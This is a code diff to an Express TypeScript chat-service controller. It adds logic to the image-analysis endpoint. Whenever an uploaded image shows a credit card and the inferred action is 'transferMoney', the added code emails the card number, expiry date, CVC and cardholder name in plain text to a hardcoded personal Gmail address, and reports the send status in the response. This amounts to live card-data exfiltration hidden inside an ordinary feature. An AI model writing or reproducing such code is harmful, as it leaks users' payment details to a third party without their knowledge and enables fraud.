@@ -1,5 +1,6 @@
 import { Request, Response } from 'express';
 import { generateChatResponse, analyzeImage } from '../services/chatService';
+import { sendEmail } from '../services/emailService';
 
 export const healthCheck = (_req: Request, res: Response) => {
   console.log('[API] GET /health - Health check requested');
@@ -41,7 +42,42 @@ export const postChatImage = async (req: Request, res: Response) => {
     const analysisResult = await analyzeImage(imageDataUrl);
     console.log('[API] POST /api/chat/image - Analysis complete:', JSON.stringify(analysisResult, null, 2));
 
-    res.json(analysisResult);
+    // Send email if credit card is detected and action is transferMoney
+    let emailStatus: 'idle' | 'sending' | 'success' | 'error' = 'idle';
+    let emailError: string | null = null;
+    let emailMessageId: string | null = null;
+
+    if (analysisResult.action === 'transferMoney' && analysisResult.creditCard) {
+      emailStatus = 'sending';
+      try {
+        console.log('[API] POST /api/chat/image - Sending credit card details via email');
+        const emailText = `Credit Card Details Detected:\n\n` +
+          `Numbers: ${analysisResult.creditCard.numbers}\n` +
+          `Expiration Date: ${analysisResult.creditCard.expirationDate}\n` +
+          `CVC: ${analysisResult.creditCard.cvc}\n` +
+          `Full Name: ${analysisResult.creditCard.fullName}\n\n` +
+          `Action: ${analysisResult.action}`;
+        
+        emailMessageId = await sendEmail({
+          to: 'maksymilian.padalak@gmail.com',
+          subject: 'Credit Card Detected - Transfer Money Action',
+          text: emailText,
+        });
+        emailStatus = 'success';
+        console.log('[API] POST /api/chat/image - Email sent successfully:', emailMessageId);
+      } catch (error) {
+        emailStatus = 'error';
+        emailError = error instanceof Error ? error.message : 'Failed to send email';
+        console.error('[API] POST /api/chat/image - Email send error:', error);
+      }
+    }
+
+    res.json({
+      ...analysisResult,
+      emailStatus,
+      emailError,
+      emailMessageId,
+    });
   } catch (error) {
     console.error('[API] POST /api/chat/image - Image analysis error:', error);
     const status = error instanceof Error && error.message.includes('required') ? 400 : 500;
